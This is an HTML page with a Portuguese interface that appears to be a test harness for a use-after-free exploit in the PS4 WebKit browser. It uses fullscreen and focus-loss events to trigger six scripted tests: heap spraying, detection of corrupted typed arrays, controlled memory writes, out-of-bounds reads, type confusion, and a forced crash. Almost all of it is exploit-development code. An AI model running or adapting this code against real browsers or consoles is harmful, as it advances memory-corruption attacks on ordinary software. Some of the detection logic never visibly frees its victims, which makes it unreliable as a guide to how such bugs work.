<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit UAF - Testes 2</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; padding: 10px; margin: 0; }
        button { background: #0f0; color: #000; border: none; padding: 10px; margin: 5px; cursor: pointer; }
        button:disabled { background: #333; }
        .log { background: #111; border: 1px solid #0f0; padding: 5px; margin: 5px 0; height: 200px; overflow-y: auto; font-size: 11px; }
        .test { border: 1px solid #0f0; padding: 10px; margin: 10px 0; }
        .success { color: #0f0; }
        .warning { color: #ff0; }
        .error { color: #f00; }
        .info { color: #0af; }
        h1 { color: #0f0; font-size: 20px; }
        h2 { color: #0f0; font-size: 16px; margin: 5px 0; }
    </style>
</head>
<body>

<h1>PS4 WebKit UAF - Testes de Sanidade</h1>

<div style="border:2px solid #ff0; padding:10px; margin:10px 0;">
    <strong>INSTRUÇÕES:</strong><br>
    1. Clique no botão do teste<br>
    2. Espere fullscreen ativar<br>
    3. Aperte OPTIONS, CIRCLE, PS Button ou espere 5s<br>
    4. Veja os logs abaixo
</div>

<div class="test">
    <h2>Teste 1: Detecção de Corrupção</h2>
    <button id="btn1" onclick="runTest(1)">▶ Executar Teste 1</button>
    <button onclick="clearLog('log1')">Limpar</button>
    <div id="log1" class="log"></div>
</div>

<div class="test">
    <h2>Teste 2: Controle de Escrita</h2>
    <button id="btn2" onclick="runTest(2)">▶ Executar Teste 2</button>
    <button onclick="clearLog('log2')">Limpar</button>
    <div id="log2" class="log"></div>
</div>

<div class="test">
    <h2>Teste 3: Out-of-Bounds Read</h2>
    <button id="btn3" onclick="runTest(3)">▶ Executar Teste 3</button>
    <button onclick="clearLog('log3')">Limpar</button>
    <div id="log3" class="log"></div>
</div>

<div class="test">
    <h2>Teste 4: Type Confusion</h2>
    <button id="btn4" onclick="runTest(4)">▶ Executar Teste 4</button>
    <button onclick="clearLog('log4')">Limpar</button>
    <div id="log4" class="log"></div>
</div>

<div class="test">
    <h2>Teste 5: Heap Spray Effectiveness</h2>
    <button id="btn5" onclick="runTest(5)">▶ Executar Teste 5</button>
    <button onclick="clearLog('log5')">Limpar</button>
    <div id="log5" class="log"></div>
</div>

<div class="test">
    <h2>Teste 6: Crash Controllability</h2>
    <button id="btn6" onclick="runTest(6)">▶ Executar Teste 6 (CRASH)</button>
    <button onclick="clearLog('log6')">Limpar</button>
    <div id="log6" class="log"></div>
</div>

<iframe id="testFrame" style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;border:none;"></iframe>

<script>
let currentTest = 0;
let testTimeout = null;

window.addEventListener('message', function(e) {
    if (e.data.type === 'log') {
        log('log' + currentTest, e.data.message, e.data.level);
    } else if (e.data.type === 'complete') {
        completeTest(currentTest);
    }
});

function log(logId, message, type = 'info') {
    const logDiv = document.getElementById(logId);
    const timestamp = new Date().toLocaleTimeString();
    logDiv.innerHTML += '<div class="' + type + '">[' + timestamp + '] ' + message + '</div>';
    logDiv.scrollTop = logDiv.scrollHeight;
}

function clearLog(logId) {
    document.getElementById(logId).innerHTML = '';
}

function completeTest(testNum) {
    document.getElementById('btn' + testNum).disabled = false;
    if (testTimeout) {
        clearTimeout(testTimeout);
        testTimeout = null;
    }
    setTimeout(() => {
        const oldFrame = document.getElementById('testFrame');
        oldFrame.parentNode.removeChild(oldFrame);
        const newFrame = document.createElement('iframe');
        newFrame.id = 'testFrame';
        newFrame.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;border:none;';
        document.body.appendChild(newFrame);
    }, 1000);
}

function runTest(testNum) {
    currentTest = testNum;
    clearLog('log' + testNum);
    log('log' + testNum, 'Iniciando Teste ' + testNum, 'info');
    document.getElementById('btn' + testNum).disabled = true;
    
    testTimeout = setTimeout(() => {
        log('log' + testNum, 'Timeout - teste não completou', 'error');
        document.getElementById('btn' + testNum).disabled = false;
    }, 30000);
    
    const iframe = document.getElementById('testFrame');
    const doc = iframe.contentDocument || iframe.contentWindow.document;
    doc.open();
    doc.write(getTestHTML(testNum));
    doc.close();
}

function getTestHTML(testNum) {
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><style>body{margin:0;padding:20px;background:#000;color:#0f0;font-family:monospace;font-size:24px;text-align:center;}#status{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);}</style></head><body><div id="status"><h1>TESTE ' + testNum + '</h1><p id="msg">Preparando...</p></div><script>const testNum=' + testNum + ';let triggered=false;function log(m,l){window.parent.postMessage({type:"log",message:m,level:l||"info"},"*");}function complete(){window.parent.postMessage({type:"complete"},"*");}function toHex(v){try{const b=new ArrayBuffer(8);new Float64Array(b)[0]=v;return "0x"+Array.from(new Uint8Array(b)).reverse().map(x=>x.toString(16).padStart(2,"0")).join("");}catch(e){return "ERROR";}}function msg(t){document.getElementById("msg").textContent=t;}function trigger(s){if(triggered)return;triggered=true;log("TRIGGER: "+s,"warning");msg("EXECUTANDO!");setTimeout(()=>executeTest' + testNum + '(),100);}let fsActive=false;setTimeout(()=>{msg("Fullscreen...");log("Solicitando fullscreen","info");const e=document.documentElement;const f=e.webkitRequestFullscreen||e.requestFullscreen;if(f){f.call(e).then(()=>{fsActive=true;msg("FULLSCREEN!\\n\\nAPERTE OPTIONS\\nCIRCLE ou PS");log("Fullscreen ativado!","success");log("Aguardando trigger...","warning");setupTriggers();}).catch(err=>{log("Erro fullscreen: "+err,"error");setTimeout(()=>trigger("no-fullscreen"),2000);});}else{log("Fullscreen API indisponível","error");setTimeout(()=>trigger("no-fs-api"),2000);}},500);function setupTriggers(){window.addEventListener("blur",()=>{if(!fsActive)return;log("Evento: blur","info");trigger("blur");});document.addEventListener("visibilitychange",()=>{if(!fsActive)return;log("Evento: visibilitychange (hidden="+document.hidden+")","info");if(document.hidden)trigger("visibilitychange");});document.addEventListener("webkitfullscreenchange",()=>{log("Evento: webkitfullscreenchange","info");if(fsActive&&!document.webkitFullscreenElement)trigger("fullscreenchange");});document.addEventListener("fullscreenchange",()=>{log("Evento: fullscreenchange","info");if(fsActive&&!document.fullscreenElement)trigger("fullscreenchange");});window.addEventListener("pagehide",()=>{if(!fsActive)return;log("Evento: pagehide","info");trigger("pagehide");});let lastFocus=document.hasFocus();setInterval(()=>{if(!fsActive)return;const now=document.hasFocus();if(lastFocus&&!now){log("Focus perdido (poll)","info");trigger("focus-poll");}lastFocus=now;},100);setTimeout(()=>{if(!fsActive)return;log("Timer fallback (10s)","warning");trigger("auto-timer");},10000);}' + getTestCode(testNum) + '<\/script></body></html>';
}

function getTestCode(testNum) {
    const tests = {
        1: 'function executeTest1(){let v=[];const M=2.121995791e-314,C=3000;log("Criando "+C+" arrays","info");for(let i=0;i<C;i++){let a=new Float64Array(8);a[0]=i;a[1]=i*2;v.push(a);}log("Arrays criados","success");msg("Spray...");log("Heap spray...","info");let s=[];for(let i=0;i<5000;i++){let a=new Float64Array(10);a.fill(M);s.push(a);}log("Spray completo","success");msg("Verificando...");log("Verificando corrupção...","info");let cc=0,idx=[];for(let i=0;i<v.length;i++){if(v[i][0]===M){cc++;idx.push(i);if(cc<=3){log("CORRUPÇÃO index "+i,"error");log("  [0]: "+toHex(v[i][0]),"info");log("  [1]: "+toHex(v[i][1]),"info");}}}if(cc>0){const r=(cc/C*100).toFixed(2);log("","success");log("UAF CONFIRMADO!","error");log(cc+" corrompidos ("+r+"%)","warning");log("Índices: "+idx.slice(0,10).join(", "),"info");msg("UAF OK!\\n"+cc+" corrompidos");}else{log("Sem corrupção","warning");msg("Sem corrupção");}setTimeout(()=>complete(),3000);}',
        
        2: 'function executeTest2(){let v=[];const S=2.121995791e-314;log("Preparando...","info");for(let i=0;i<3000;i++)v.push(new Float64Array(8));log("Vítimas OK","success");msg("Spray...");log("Spray...","info");let s=[];for(let i=0;i<5000;i++)s.push(new Float64Array(10).fill(S));msg("Procurando...");let c=null,ix=-1;for(let i=0;i<v.length;i++){if(v[i][0]===S){c=v[i];ix=i;break;}}if(c){log("Vítima: index "+ix,"error");msg("Testando escrita...");log("Testando escrita...","info");const p=[0xDEADBEEF,0x1337C0DE,0x42424242];let ws=0;p.forEach((pt,i)=>{try{const b=new ArrayBuffer(8);new BigUint64Array(b)[0]=BigInt(pt);c[i]=new Float64Array(b)[0];const rb=new ArrayBuffer(8);new Float64Array(rb)[0]=c[i];const r=Number(new BigUint64Array(rb)[0]);if(r===pt){log("  ["+i+"]: OK - 0x"+pt.toString(16),"success");ws++;}else{log("  ["+i+"]: Mismatch","warning");}}catch(e){log("  ["+i+"]: "+e.message,"error");}});if(ws===p.length){log("","info");log("ESCRITA 100% OK!","success");msg("ESCRITA OK!\\n"+ws+"/3");}else{log("Escrita parcial: "+ws+"/"+p.length,"warning");msg("Parcial\\n"+ws+"/3");}}else{log("Sem corrupção","warning");msg("Sem corrupção");}setTimeout(()=>complete(),3000);}',
        
        3: 'function executeTest3(){let v=[];const S=2.121995791e-314;log("Criando vítimas...","info");for(let i=0;i<3000;i++)v.push(new Float64Array(8));msg("Spray...");log("Spray...","info");let s=[];for(let i=0;i<5000;i++)s.push(new Float64Array(10).fill(S));msg("Procurando...");let c=v.find(x=>x[0]===S);if(c){log("Vítima encontrada","error");msg("Testando OOB...");log("Testando OOB...","info");const lim=[8,16,32,64,128];let oob=false;lim.forEach(l=>{let ok=0,u=new Set();for(let i=0;i<l;i++){try{const va=c[i];if(va!==undefined){ok++;u.add(toHex(va));}}catch(e){}}log("Limite "+l+": "+ok+" lidos, "+u.size+" únicos","info");if(ok>8){const ex=ok-8;log("OOB READ! +"+ex+" bytes","error");oob=true;}});if(oob){msg("OOB READ\\nOK!");}else{msg("Sem OOB");}}else{log("Sem corrupção","warning");msg("Sem corrupção");}setTimeout(()=>complete(),3000);}',
        
        4: 'function executeTest4(){let t=[],o=[];log("Criando objetos...","info");for(let i=0;i<1500;i++){t.push(new Float64Array(8).fill(i));o.push({id:i,data:"obj_"+i,nested:{v:i*2}});}log("Objetos criados","success");msg("Spray...");log("Spray...","info");const P=2.121995791e-314;let s=[];for(let i=0;i<5000;i++)s.push(new Float64Array(10).fill(P));msg("Verificando...");log("Verificando type confusion...","info");let oc=0;o.forEach((ob,i)=>{try{if(typeof ob.id!=="number"||ob.id!==i){oc++;if(oc<=3)log("Objeto["+i+"] corrompido","error");}}catch(e){oc++;}});let tc=t.filter(x=>x[0]===P).length;log("Float64: "+tc+" corrompidos",tc>0?"error":"success");log("Objetos: "+oc+" corrompidos",oc>0?"error":"success");if(oc>0){log("TYPE CONFUSION!","error");msg("TYPE CONFUSION!\\n"+oc);}else{msg("Sem confusion\\n"+tc);}setTimeout(()=>complete(),3000);}',
        
        5: 'function executeTest5(){const C=5000;let v=[];log("Criando "+C+" vítimas...","info");for(let i=0;i<C;i++)v.push(new Float64Array(8).fill(i));msg("Testando configs...");log("Testando configs...","info");const cfg=[{size:1000,p:0x1111},{size:5000,p:0x2222},{size:10000,p:0x3333}];cfg.forEach((c,ix)=>{const b=new ArrayBuffer(8);new Uint32Array(b)[0]=c.p;const fp=new Float64Array(b)[0];let s=[];for(let i=0;i<c.size;i++)s.push(new Float64Array(10).fill(fp));let cr=v.filter(x=>{const vb=new ArrayBuffer(8);new Float64Array(vb)[0]=x[0];return new Uint32Array(vb)[0]===c.p;}).length;const ef=(cr/C*100).toFixed(2);log("Config "+(ix+1)+": size="+c.size+" → "+cr+" ("+ef+"%)",cr>0?"error":"info");});msg("Completo");setTimeout(()=>complete(),3000);}',
        
        6: 'function executeTest6(){let v=[];log("Preparando...","info");for(let i=0;i<3000;i++)v.push(new Float64Array(8));msg("Corrupção...");log("Corrupção...","warning");const P=2.121995791e-314;let s=[];for(let i=0;i<5000;i++)s.push(new Float64Array(10).fill(P));let c=v.find(x=>x[0]===P);if(c){log("Vítima corrompida","error");log("CRASH em 3s","error");let cd=3;const iv=setInterval(()=>{log(cd+"...","error");msg("CRASH EM\\n"+cd+"s");cd--;if(cd<0){clearInterval(iv);log("TRIGGERING CRASH!","error");msg("CRASHING!");try{document.open();document.write("<html><body><h1>CRASH</h1></body></html>");document.close();setTimeout(()=>location.reload(),100);}catch(e){log("Crash: "+e.message,"error");complete();}}},1000);}else{log("Sem corrupção","warning");msg("Sem corrupção");setTimeout(()=>complete(),3000);}}'
    };
    return tests[testNum] || 'function executeTest(){log("Não implementado","error");complete();}';
}
</script>

</body>
</html>
